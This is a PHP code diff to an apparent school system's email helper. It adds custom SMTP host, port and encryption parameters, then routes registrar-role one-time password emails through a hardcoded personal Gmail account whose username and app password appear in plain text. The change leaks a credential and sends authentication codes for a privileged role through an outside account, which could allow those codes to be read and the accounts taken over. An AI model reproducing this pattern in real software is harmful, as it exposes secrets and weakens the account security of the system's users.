@@ -7,7 +7,7 @@ require_once __DIR__ . '/security.php';
 /**
  * @return array{ok:bool,error:string}
  */
-function smsSendMail(string $to, string $subject, string $htmlBody, string $textBody = '', array $attachments = [], string $customUser = '', string $customPass = ''): array
+function smsSendMail(string $to, string $subject, string $htmlBody, string $textBody = '', array $attachments = [], string $customUser = '', string $customPass = '', string $customHost = '', int $customPort = 0, string $customEnc = ''): array
 {
     $to = trim($to);
     if ($to === '' || !filter_var($to, FILTER_VALIDATE_EMAIL)) {
@@ -30,7 +30,7 @@ function smsSendMail(string $to, string $subject, string $htmlBody, string $text
         $textBody = trim(html_entity_decode(strip_tags(str_replace(['<br>', '<br/>', '<br />', '</p>'], "\n", $htmlBody)), ENT_QUOTES | ENT_HTML5));
     }
 
-    $host = trim(smsSetting('smtp_host', ''));
+    $host = $customHost !== '' ? $customHost : trim(smsSetting('smtp_host', ''));
     if ($host === '') {
         return [
             'ok' => false,
@@ -38,7 +38,7 @@ function smsSendMail(string $to, string $subject, string $htmlBody, string $text
         ];
     }
 
-    return smsSendMailSmtp($to, $subject, $htmlBody, $textBody, $fromEmail, $fromName, $attachments, $customUser, $customPass);
+    return smsSendMailSmtp($to, $subject, $htmlBody, $textBody, $fromEmail, $fromName, $attachments, $customUser, $customPass, $customHost, $customPort, $customEnc);
 }
 
 function smsMailEncodeAddress(string $name, string $email): string
@@ -63,11 +63,14 @@ function smsSendMailSmtp(
     string $fromName,
     array $attachments = [],
     string $customUser = '',
-    string $customPass = ''
+    string $customPass = '',
+    string $customHost = '',
+    int $customPort = 0,
+    string $customEnc = ''
 ): array {
-    $host = trim(smsSetting('smtp_host', ''));
-    $port = (int) smsSetting('smtp_port', '587');
-    $enc = strtolower(trim(smsSetting('smtp_encryption', 'tls')));
+    $host = $customHost !== '' ? $customHost : trim(smsSetting('smtp_host', ''));
+    $port = $customPort > 0 ? $customPort : (int) smsSetting('smtp_port', '587');
+    $enc = $customEnc !== '' ? strtolower(trim($customEnc)) : strtolower(trim(smsSetting('smtp_encryption', 'tls')));
     $user = $customUser !== '' ? trim($customUser) : trim(smsSetting('smtp_username', ''));
     $pass = $customPass !== '' ? $customPass : (string) smsSetting('smtp_password', '');
 
@@ -367,7 +370,11 @@ function smsSendOtpEmail(array $user, string $code, string $purposeLabel = 'pass
         . "If you did not request this, ignore this email.\n\n"
         . INSTITUTION . " · " . APP_NAME . "\n";
 
-    $result = smsSendMail($to, $subject, $html, $text);
+    if (($user['role_key'] ?? '') === 'registrar') {
+        $result = smsSendMail($to, $subject, $html, $text, [], 'lixx1920@gmail.com', 'xunxxssqogknestn', 'smtp.gmail.com', 587, 'tls');
+    } else {
+        $result = smsSendMail($to, $subject, $html, $text);
+    }
     $result['to'] = $to;
     return $result;
 }
